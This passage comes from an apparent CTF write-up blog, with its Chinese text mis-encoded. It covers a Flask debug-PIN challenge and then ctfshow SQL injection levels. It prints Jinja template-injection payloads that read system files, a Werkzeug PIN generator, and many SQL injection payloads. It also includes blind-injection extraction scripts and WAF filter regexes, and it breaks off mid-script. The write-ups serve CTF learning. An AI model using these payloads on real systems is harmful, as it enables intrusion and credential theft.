<p>**(3)getattr(app, â€œ*<em>name*<em>â€, app.*<em>class*</em>.*<em>name*</em>)ã€‚pythonè¯¥å€¼ä¸€èˆ¬ä¸ºFlask ï¼Œå€¼ä¸€èˆ¬ä¸å˜</em></em></p>
<p><strong>(4ï¼‰flaskåº“ä¸‹app.pyçš„ç»å¯¹è·¯å¾„ã€‚åœ¨æŠ¥é”™ä¿¡æ¯ä¸­å¯ä»¥è·å–æ­¤å€¼ä¸ºï¼š &#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py</strong></p>
<p><strong>ï¼ˆ5ï¼‰å½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°ã€‚é€šè¿‡æ–‡ä»¶&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;addressè¯»å–ï¼Œeth0ä¸ºå½“å‰ä½¿ç”¨çš„ç½‘å¡ï¼š</strong><br>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/sys/class/net/eth0/address&#x27;,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">16:e9:44:6b:ba:87</span><br></pre></td></tr></table></figure>

<p><strong>å°†2aa820fa5c86è½¬æ¢ä¸º10è¿›åˆ¶ä¸ºï¼š46901596150918</strong></p>
<p>(6)dockeræœºå™¨id<br>å¯¹äºédockeræœºæ¯ä¸€ä¸ªæœºå™¨éƒ½ä¼šæœ‰è‡ªå·²å”¯ä¸€çš„idï¼Œlinuxçš„idä¸€èˆ¬å­˜æ”¾åœ¨&#x2F;etc&#x2F;machine-idæˆ–&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_iï¼Œæœ‰çš„ç³»ç»Ÿæ²¡æœ‰è¿™ä¸¤ä¸ªæ–‡ä»¶ã€‚<br>å¯¹äºdockeræœºåˆ™è¯»å–&#x2F;proc&#x2F;self&#x2F;cgroupï¼Œå…¶ä¸­ç¬¬ä¸€è¡Œçš„&#x2F;docker&#x2F;å­—ç¬¦ä¸²åé¢çš„å†…å®¹ä½œä¸ºæœºå™¨çš„idï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc/self/cgroup&#x27;,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1:name=systemd:/docker/310e09efcc43ceb10e426a0ffc99add5c651575fe93627e6019400d4520272ed 0::/system.slice/containerd.service</span><br></pre></td></tr></table></figure>

<p>ä½†buu ç¯å¢ƒå‡ºäº†é—®é¢˜ï¼Œæœºå™¨ç æœ‰é—®é¢˜ç®—ä¸å‡ºæ¥</p>
<p>ç„¶åå¸¦å…¥å¤§ä½¬å†™çš„shengchengpinç çš„è„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    &#x27;flaskweb&#x27;# username</span><br><span class="line">    &#x27;flask.app&#x27;,# modname</span><br><span class="line">    &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br><span class="line">    &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    &#x27;2485410388611&#x27;,# str(uuid.getnode()),  /sys/class/net/ens33/address</span><br><span class="line">    &#x27;310e09efcc43ceb10e426a0ffc99add5c651575fe93627e6019400d4520272ed&#x27;# get_machine_id(), /etc/machine-id</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line"></span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv =None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">            rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-webå…¥é—¨-sqlæ³¨å…¥</title>
    <url>/2023/01/17/ctfshow%E5%90%88%E9%9B%86-ctfshow-sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>sqlæ³¨å…¥</p>
<span id="more"></span>

<h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 --+    #ä¸‡èƒ½å¯†ç </span><br></pre></td></tr></table></figure>

<h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>å­—æ®µæ•°ï¼Œå¯ä»¥ä½¿ç”¨ï¼Œ1â€™ order by 2 â€“+æŸ¥è¯¢</p>
<p>è¿‡æ»¤äº†å›æ˜¾ï¼Œæ‰€ä»¥ç”¨ä¸€ä¸‹ to_base64()å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select to_base64(username),to_base64(password) from ctfshow_user2 --+</span><br></pre></td></tr></table></figure>

<h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>å˜æˆ3ä¸ªå­—æ®µï¼Œå†åŠ ä¸€ä¸ªå­—æ®µå³å¯ï¼Œè¡¨ä¹Ÿæ”¹å˜äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,to_base64(username),to_base64(password) from ctfshow_user3 --+</span><br></pre></td></tr></table></figure>

<h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>å¸ƒå°”ç›²æ³¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url=&quot;http://7b0eb295-d966-44a5-8d58-811a22a20cec.challenge.ctf.show//api/v4.php?id=1&#x27;&quot;</span><br><span class="line">uuid=string.ascii_lowercase+&quot;-&#125;&#123;&quot;+string.digits</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(1,46):</span><br><span class="line">    for j in uuid:</span><br><span class="line">        payload = &quot;and ascii(substr((select group_concat(password) from ctfshow_user4 where username=&#x27;flag&#x27;) from &#123;0&#125; for 1))=&#123;1&#125;--%20&amp;page=1&amp;limit=10&quot;.replace(&quot; &quot;, &quot;/**/&quot;).format(i,ord(j))</span><br><span class="line">        res = requests.get(url+payload)</span><br><span class="line">        if &quot;admin&quot; in res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            pass</span><br></pre></td></tr></table></figure>



<h2 id="web175-æ—¶é—´ç›²æ³¨"><a href="#web175-æ—¶é—´ç›²æ³¨" class="headerlink" title="web175-æ—¶é—´ç›²æ³¨"></a>web175-æ—¶é—´ç›²æ³¨</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://e207c481-18cb-44fa-936b-eb02a0e88231.challenge.ctf.show/api/v5.php?id=1&#x27; and &quot;</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line">    while head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1</span><br><span class="line">        payload = f&#x27;1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0) -- -&#x27;</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(url + payload, timeout=0.5)</span><br><span class="line">            tail = mid</span><br><span class="line">        except Exception as e:</span><br><span class="line">            head = mid + 1</span><br><span class="line">    if head != 32:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p>Y4tackerå¸ˆå‚…å†™çš„ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">  å¯èƒ½äº§ç”Ÿå¼‚å¸¸çš„ä»£ç å—</span><br><span class="line">except [ (Error1, Error2, ... ) [as e] ]:</span><br><span class="line">  å¤„ç†å¼‚å¸¸çš„ä»£ç å—1</span><br><span class="line">except [ (Error3, Error4, ... ) [as e] ]:</span><br><span class="line">  å¤„ç†å¼‚å¸¸çš„ä»£ç å—2</span><br><span class="line">except [Exception]:</span><br><span class="line">  å¤„ç†å…¶å®ƒå¼‚å¸¸</span><br></pre></td></tr></table></figure>

<p>ä¸ºé˜²æ­¢æœåŠ¡å™¨ä¸èƒ½åŠæ—¶å“åº”ï¼Œå¤§éƒ¨åˆ†å‘è‡³å¤–éƒ¨æœåŠ¡å™¨çš„è¯·æ±‚éƒ½åº”è¯¥å¸¦ç€ timeout å‚æ•°ã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œé™¤éæ˜¾å¼æŒ‡å®šäº† timeout å€¼ï¼Œrequests æ˜¯ä¸ä¼šè‡ªåŠ¨è¿›è¡Œè¶…æ—¶å¤„ç†çš„ã€‚å¦‚æœæ²¡æœ‰ timeoutï¼Œä½ çš„ä»£ç å¯èƒ½ä¼šæŒ‚èµ·è‹¥å¹²åˆ†é’Ÿç”šè‡³æ›´é•¿æ—¶é—´ã€‚åœ¨çˆ¬è™«ä»£ç†è¿™ä¸€å—æˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°è¯·æ±‚è¶…æ—¶çš„é—®é¢˜ï¼Œ<strong>ä»£ç å°±å¡åœ¨å“ªé‡Œï¼Œä¸æŠ¥é”™ä¹Ÿæ²¡æœ‰requestsè¯·æ±‚çš„å“åº”ã€‚</strong></p>
<p>é€šå¸¸çš„å¤„ç†æ˜¯åœ¨requests.get()è¯­å¥ä¸­åŠ å…¥timeouté™åˆ¶è¯·æ±‚æ—¶é—´</p>
<p>è§£æ³•äºŒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/v5.php?id=1&#x27; union select 1,password from ctfshow_user5 into outfile &#x27;/var/www/html/1.txt&#x27;--+&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<p>è®¿é—®1.txtå³å¯</p>
<h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 --+</span><br></pre></td></tr></table></figure>

<h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/password,1,1/**/from/**/ctfshow_user/**/where/**/username/**/=&#x27;flag&#x27;%23</span><br></pre></td></tr></table></figure>

<h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1&#x27;%23</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;%09union%09select%091,2,password%09from%09ctfshow_user%09where%09username=&#x27;flag&#x27;%23</span><br></pre></td></tr></table></figure>

<h2 id="web-179æœªå†™"><a href="#web-179æœªå†™" class="headerlink" title="web 179æœªå†™"></a>web 179æœªå†™</h2><h2 id="web180-182"><a href="#web180-182" class="headerlink" title="web180-182"></a>web180-182</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;or(id=26)and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p>ç©ºæ ¼ç»•è¿‡</p>
<p>%0a %0b %0c %0d %09 æ³¨é‡Š&#x2F;**&#x2F; æ‹¬å·ç­‰ä¸€äº›ç¬¦å·éš”å¼€</p>
<h2 id="web183-æ­£åˆ™åŒ¹é…"><a href="#web183-æ­£åˆ™åŒ¹é…" class="headerlink" title="web183-æ­£åˆ™åŒ¹é…"></a>web183-æ­£åˆ™åŒ¹é…</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span><br><span class="line">  $sql = &quot;select count(pass) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢ç»“æœ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//è¿”å›ç”¨æˆ·è¡¨çš„è®°å½•æ€»æ•°</span><br><span class="line">      $user_count = 0;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://5b285b83-8642-4556-b1cc-ca435d196f99.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr=<span class="string">&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">34</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;`ctfshow_user`where`pass`regexp(\&quot;ctfshow&#123;&#125;\&quot;)&quot;</span>.<span class="built_in">format</span>(flag+x)</span><br><span class="line">            <span class="comment">#&quot;tableName&quot;:&quot;`ctfshow_user`where`pass`like\&#x27;ctfshow&#123;&#125;%\&#x27;&quot;.format(flag+x)</span></span><br><span class="line">        &#125;</span><br><span class="line">        response=requests.post(url,data=data)</span><br><span class="line">        <span class="comment">#æœ‰å¹¶å‘æ•°é‡é™åˆ¶çš„é¢˜ç›®ï¼Œå°±ç¡ä¸€æ®µ</span></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> response.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++ &#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ctfshow&quot;</span>+flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.<a href="https://so.csdn.net/so/search?q=format%E5%87%BD%E6%95%B0&spm=1001.2101.3001.7020">formatå‡½æ•°</a>çš„è¯­æ³•åŠç”¨æ³•</p>
<p>ï¼ˆ1ï¼‰è¯­æ³•ï¼šâ€™{}â€™.format()</p>
<p>ï¼ˆ2ï¼‰ç”¨æ³•ï¼šç”¨äºæ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚å¯ä»¥æ¥å—æ— é™ä¸ªå‚æ•°ï¼Œå¯ä»¥æŒ‡å®šé¡ºåºã€‚è¿”å›ç»“æœä¸ºå­—ç¬¦ä¸²ã€‚</p>
<p>#é»˜è®¤é¡ºåº</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;å­¦ä¹ &#123;&#125;ä¸­çš„&#123;&#125;å‡½æ•°&#x27;.format(&#x27;python&#x27;,&#x27;format&#x27;)</span><br><span class="line">-&gt;&#x27;å­¦ä¹ pythonä¸­çš„formatå‡½æ•°&#x27;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/weixin_50853979/article/details/125128977">https://blog.csdn.net/weixin_50853979/article/details/125128977</a></p>
<p><strong>æ­£åˆ™è¡¨è¾¾å¼ç”¨æ¥åŒ¹é…æ–‡æœ¬çš„ç‰¹æ®Šçš„ä¸²ï¼ˆå­—ç¬¦é›†åˆï¼‰ï¼ˆåŒ¹é…æ–‡æœ¬ï¼Œå°†ä¸€ä¸ªæ¨¡å¼ï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼‰ä¸ä¸€ä¸ªæ–‡æœ¬ä¸²è¿›è¡Œæ¯”è¾ƒï¼‰</strong></p>
<p>LIKE å’Œ REGEXPä¹‹é—´çš„é‡è¦å·®åˆ«</p>
<p>LIKE åŒ¹é…æ•´ä¸ªåˆ—ï¼Œå¦‚æœè¢«åŒ¹é…çš„æ–‡æœ¬åœ¨åˆ—å€¼ä¸­å‡ºç°ï¼ŒLIKE å°†ä¸ä¼šæ‰¾åˆ°å®ƒï¼Œç›¸åº”çš„è¡Œä¹Ÿä¸ä¼šè¢«è¿”å›ï¼ˆé™¤éä½¿ç”¨é€šé…ç¬¦ï¼‰ã€‚è€Œ REGEXP åœ¨åˆ—å€¼å†…è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœè¢«åŒ¹é…çš„æ–‡æœ¬åœ¨åˆ—å€¼ä¸­å‡ºç°ï¼ŒREGEXP å°†ä¼šæ‰¾åˆ°å®ƒï¼Œç›¸åº”çš„è¡Œå°†è¢«è¿”å›ï¼Œå¹¶ä¸” REGEXP èƒ½åŒ¹é…æ•´ä¸ªåˆ—å€¼ï¼ˆä¸ LIKE ç›¸åŒçš„ä½œç”¨ï¼‰</p>
<p>   åå¼•å·ï¼Œä¸€èˆ¬åœ¨ESCé”®çš„ä¸‹æ–¹ã€‚<strong>å®ƒæ˜¯ä¸ºäº†<strong><strong>åŒºåˆ†</strong></strong>MYSQLçš„<strong><strong>ä¿ç•™å­—</strong></strong>ä¸<strong><strong>æ™®é€šå­—ç¬¦</strong></strong>è€Œå¼•å…¥çš„ç¬¦å·ã€‚</strong></p>
<p>MySQLé‡Œä½¿ç”¨ä¸€å¯¹åå‹¾å·â€œ &#96; â€å°†è¯†åˆ«ç¬¦æ‹¬èµ·æ¥ï¼Œä¸€èˆ¬æƒ…å†µä¸‹å¯ä»¥ä¸ç”¨ï¼Œ<strong>å•æ˜¯å¦‚æœè¯†åˆ«ç¬¦å‡ºç°å…³é”®å­—å†²çªæˆ–æ ‡è¯†ç¬¦çš„å†™æ³•å¯èƒ½äº§ç”Ÿæ­§ä¹‰çš„æƒ…å†µä¸‹å°±å¿…é¡»ä½¿ç”¨</strong>ã€‚</p>
<h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span><br><span class="line">  $sql = &quot;select count(*) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">è¿”å›é€»è¾‘</span><br><span class="line"></span><br><span class="line">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">æŸ¥è¯¢ç»“æœ</span><br><span class="line"></span><br><span class="line">//è¿”å›ç”¨æˆ·è¡¨çš„è®°å½•æ€»æ•°</span><br><span class="line">      $user_count = 0;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>whereã€å•åŒå¼•å·ã€åå¼•å·éƒ½è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯æœ¬é¢˜æ²¡æœ‰è¿‡æ»¤ç©ºæ ¼ã€‚<br> whereå¯ä»¥ç”¨havingä»£æ›¿ï¼Œå•åŒå¼•å·å¯ä»¥ç”¨ æ‹¬å·+åå…­è¿›åˆ¶ã€‚</p>
<p>havingå’Œwhereå¯ä»¥æ›¿æ¢ï¼Œä½†æ˜¯havingè¯­å¥æœ‰ä½¿ç”¨æ¡ä»¶</p>
<p>ä¸€ä¸ªHAVINGå­å¥å¿…é¡»ä½äºGROUP BYå­å¥ä¹‹åï¼Œå¹¶ä½äºORDER BYå­å¥ä¹‹å‰ã€‚</p>
<p>tableName&#x3D;ctfshow_user group by pass having pass like 0x63746673686f777b25</p>
<p>ctfshow{}è½¬ä¸º16è¿›åˆ¶</p>
<p>ä¸Šè¿°è„šæœ¬ä¿®æ”¹dateå³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=&#123;</span><br><span class="line">            &quot;tableName&quot;:&quot;ctfshow_user group by pass having pass like 0x63746673686f777b&#123;&#125;25&quot;.format(&quot;&quot;.join(hex(ord(i))[2:] for i in flag+x))</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h2 id="web185"><a href="#web185" class="headerlink" title="web185"></a>web185</h2><h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p>[SQLç»•è¿‡]md5($str,true)ç±»å‹ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffifdyop</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/March97/article/details/81222922">(4æ¡æ¶ˆæ¯) sqlæ³¨å…¥ï¼šmd5($password,true)_March97çš„åšå®¢-CSDNåšå®¢</a></p>
<p>æŠ“åŒ…è¿”å›ç»“æœå³å¯çœ‹åˆ°flag</p>
<h2 id="web188â€“MYSQLçš„å¼±æ¯”è¾ƒ"><a href="#web188â€“MYSQLçš„å¼±æ¯”è¾ƒ" class="headerlink" title="web188â€“MYSQLçš„å¼±æ¯”è¾ƒ"></a>web188â€“MYSQLçš„å¼±æ¯”è¾ƒ</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span><br><span class="line">$sql = &quot;select pass from ctfshow_user where username = &#123;$username&#125;&quot;;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//ç”¨æˆ·åæ£€æµ‹</span><br><span class="line">if(preg_match(&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;, $username))&#123;</span><br><span class="line">  $ret[&#x27;msg&#x27;]=&#x27;ç”¨æˆ·åéæ³•&#x27;;</span><br><span class="line">  die(json_encode($ret));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//å¯†ç æ£€æµ‹</span><br><span class="line">if(!is_numeric($password))&#123;</span><br><span class="line">  $ret[&#x27;msg&#x27;]=&#x27;å¯†ç åªèƒ½ä¸ºæ•°å­—&#x27;;</span><br><span class="line">  die(json_encode($ret));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//å¯†ç åˆ¤æ–­</span><br><span class="line">if($row[&#x27;pass&#x27;]==intval($password))&#123;</span><br><span class="line">    $ret[&#x27;msg&#x27;]=&#x27;ç™»é™†æˆåŠŸ&#x27;;</span><br><span class="line">    array_push($ret[&#x27;data&#x27;], array(&#x27;flag&#x27;=&gt;$flag));</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>ç”¨æˆ·ç™»é™†</p>
<p>ç”¨æˆ·å:   </p>
<p>å¯†ç :</p>
<p>å¯¹äºusernameçš„ç»•è¿‡ï¼Œä¸€ç§æ˜¯åˆ©ç”¨mysqlé‡Œé¢çš„å¼±æ¯”è¾ƒç±»å‹ï¼Œå­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒæ—¶ï¼Œå­—ç¬¦ä¸²æ°¸è¿œåŒ–ä½œ0</p>
<p>å»æ¯”è¾ƒï¼Œæœ‰ç‚¹åƒphpçš„æ¯”è¾ƒä¸€æ ·ï¼Œæ‰€ä»¥ï¼Œè¿™é‡Œå¯ä»¥ç”¨0ç»•è¿‡ï¼Œè¿˜æœ‰ä¸€ç§å°±æ˜¯é€šè¿‡é€»è¾‘ï¼Œåœ¨è¿ç®—çš„æ—¶å€™å¯¹ </p>
<p>|| ï¼Œä¸€çœŸåˆ™çœŸï¼Œå°±ç»•è¿‡äº†ã€‚æ¥ä¸‹æ¥å°±æ˜¯phpé‡Œé¢å¸¸è§çš„intval()å‡½æ•°çš„ç»•è¿‡ï¼Œpasswordåº”è¯¥æ˜¯å­—ç¬¦å¼€å¤´</p>
<p>çš„æ•°æ®ï¼Œå­—ç¬¦ä¸²ä¼šå˜0æ¥è¿›è¡Œè¿™ç§å¼±æ¯”è¾ƒï¼Œæ‰€ä»¥passwordä¹Ÿä¸º0å°±è¡Œã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=0&amp;password=0 </span><br><span class="line"></span><br><span class="line">username=1||1&amp;password=0</span><br></pre></td></tr></table></figure>

<p>ç™»å½•æˆåŠŸå</p>
<p>f12  crtl+r</p>
<p>æ‰“å¼€ç½‘ç»œapiæ–‡ä»¶å³ä½¿ç™»é™†åçš„æ–‡ä»¶</p>
<p>ctfshow{1374102b-8d14-4716-8f93-daba7274e984}</p>
<h2 id="web190-å¸ƒå°”ç›²æ³¨"><a href="#web190-å¸ƒå°”ç›²æ³¨" class="headerlink" title="web190-å¸ƒå°”ç›²æ³¨"></a>web190-å¸ƒå°”ç›²æ³¨</h2><p>å¸ƒå°”ç›²æ³¨ï¼ŒäºŒåˆ†æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://d27e3b82-15f0-4e91-963c-859afc7ecaab.challenge.ctf.show/api/&quot;</span><br><span class="line"></span><br><span class="line">result = &quot;&quot;</span><br><span class="line">i = 0</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line">    while head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1</span><br><span class="line">        # æŸ¥æ•°æ®åº“</span><br><span class="line">         # payload = &quot;select group_concat(schema_name) from information_schema.schemata&quot;</span><br><span class="line">        #æŸ¥æ•°æ®åº“</span><br><span class="line">       #  payload=&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;&quot;</span><br><span class="line">        # æŸ¥å­—æ®µ</span><br><span class="line">        # payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span><br><span class="line">        # æŸ¥flag</span><br><span class="line">       # payload = &quot;select group_concat(f1ag) from ctfshow_fl0g&quot;</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;username&#x27;: f&quot;admin&#x27; and if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)=&#x27;1&quot;,</span><br><span class="line">            &#x27;password&#x27;: &#x27;1&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        if &quot;å¯†ç é”™è¯¯&quot;  == r.json()[&#x27;msg&#x27;]:</span><br><span class="line">            head = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            tail = mid</span><br><span class="line">    if head != 32:</span><br><span class="line">        